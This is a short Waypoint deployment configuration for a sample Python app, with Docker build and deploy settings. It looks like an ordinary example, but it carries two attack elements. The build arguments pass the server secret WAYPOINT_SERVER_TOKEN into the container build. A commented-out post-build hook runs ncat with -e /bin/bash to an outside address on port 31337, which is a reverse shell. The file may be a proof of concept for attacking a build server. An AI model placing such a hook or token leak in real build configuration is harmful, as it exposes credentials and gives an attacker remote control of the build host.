project = "example-python"

app "example-python" {
  labels = {
    "service" = "example-python",
    "env"     = "dev"
  }

  build {
    use "docker" {
      build_args = {
        foo = "bar"
        wp = "${WAYPOINT_SERVER_TOKEN}"
      }
    }
    # hook {
    #   when    = "after"
    #   command = ["ncat", "172.31.11.230", "31337", "-e", "/bin/bash"]
    # }
  }

  deploy {
    use "docker" {
      service_port = 8080
    }
  }
}
